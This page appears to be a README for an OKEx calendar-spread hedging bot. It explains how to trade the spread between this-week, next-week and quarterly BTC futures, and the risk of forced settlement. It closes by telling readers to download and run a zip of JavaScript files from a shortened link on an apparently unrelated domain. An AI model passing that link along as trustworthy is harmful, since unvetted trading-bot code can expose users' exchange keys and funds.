...
OKEx-Calendar-Spread-Hedging-Strategy
...
Calendar spread arbitrage opens equal-sized, opposite positions in different expiry contracts of the same futures instrument, then closes them through offsetting or delivery to earn from spread convergence. The simplest form is buying the near-month contract and selling the far-month contract. For example, on OKEx you can trade BTC this-week versus next-week contracts. Because the delivery dates differ by as much as three months, pricing gaps can appear. When the spread deviates from its normal range, traders can buy one contract and sell the other, then reverse both positions after the spread returns to a reasonable level to profit from mean reversion.

How to trade calendar spread hedging on OKEx?
Price differences often appear between OKEx this-week, next-week, and quarterly contracts. If the spread reaches or exceeds a chosen threshold, traders can open a calendar hedge and later close it in reverse when the spread disappears, profiting from its return to a reasonable range. For example, if a spread exists between BTC this-week and next-week contracts and the this-week contract is priced below the next-week contract, then once the spread reaches the configured threshold, the trader can go long the this-week contract and short the next-week contract in equal size. When the spread normalizes, both positions are closed in reverse to realize the profit.

Risks of calendar spread hedging:
Because the two contracts have different delivery times, losses may occur if the spread has not converged when the near-term contract is forcibly settled.

Features and characteristics:
Supports OKEx calendar spread hedging
Supports OKEx this-week, next-week, and quarterly contracts
Supports all OKEx futures symbols (BTC, BCH, EOS, BSV, ETH, etc.)

Important: this strategy depends on the Botvstools template library to run.
Download the template library here:
https://www.pcclean.io/45gd
(After downloading the zip file, extract it and you will find two js files: one is the strategy and the other is the template library. Please distinguish them carefully.)
